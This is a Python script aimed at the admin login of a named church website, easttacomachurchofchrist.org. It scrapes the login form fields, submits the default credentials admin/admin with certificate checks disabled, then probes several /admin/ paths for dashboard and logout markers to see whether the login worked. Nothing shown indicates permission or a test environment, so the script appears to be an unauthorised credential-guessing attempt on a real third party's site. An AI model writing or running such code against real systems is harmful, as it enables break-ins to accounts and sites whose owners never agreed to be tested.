#!/usr/bin/env python3
"""verify_eastta.py - 终极验证easttacomachurchofchrist.org"""
import urllib.request, urllib.parse, ssl, re, http.cookiejar

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'http://easttacomachurchofchrist.org'

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))

def fetch(url, data=None):
    body = urllib.parse.urlencode(data).encode() if data else None
    headers = {**UA, 'Content-Type': 'application/x-www-form-urlencoded'} if data else UA
    try:
        r = opener.open(urllib.request.Request(url, data=body, headers=headers), timeout=15)
        return r.status, r.read(80000).decode('utf-8', 'ignore'), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read(80000).decode('utf-8', 'ignore'), e.geturl()
    except Exception as e:
        return 0, repr(e)[:60], ''

# 1. 登录页
st, b, fu = fetch(BASE + '/admin/login.php')
print('1.login: st=%d len=%d fu=%s' % (st, len(b), fu[:70]))
fields = re.findall(r'<input[^>]*name="([^"]+)"', b)
print('  fields:', fields[:8])

# 2. POST登录
data = {}
for f in fields:
    data[f] = ''
for f in fields:
    if f.lower() in ('username', 'user', 'email'):
        data[f] = 'admin'
    elif 'pass' in f.lower() or 'pwd' in f.lower():
        data[f] = 'admin'
st2, b2, fu2 = fetch(BASE + '/admin/login.php', data)
print('2.post: st=%d len=%d fu=%s' % (st2, len(b2), fu2[:70]))

# 3. cookie访问dashboard
for path in ['/admin/login.php', '/admin/', '/admin/dashboard', '/admin/index']:
    st3, b3, fu3 = fetch(BASE + path)
    low3 = b3.lower()
    marks = [k for k in ['logout', '退出', 'dashboard', '欢迎', 'login', 'password'] if k in low3]
    print('3.cookie %s: st=%d len=%d fu=%s marks=%s' % (path, st3, len(b3), fu3[:60], marks))
print('done')
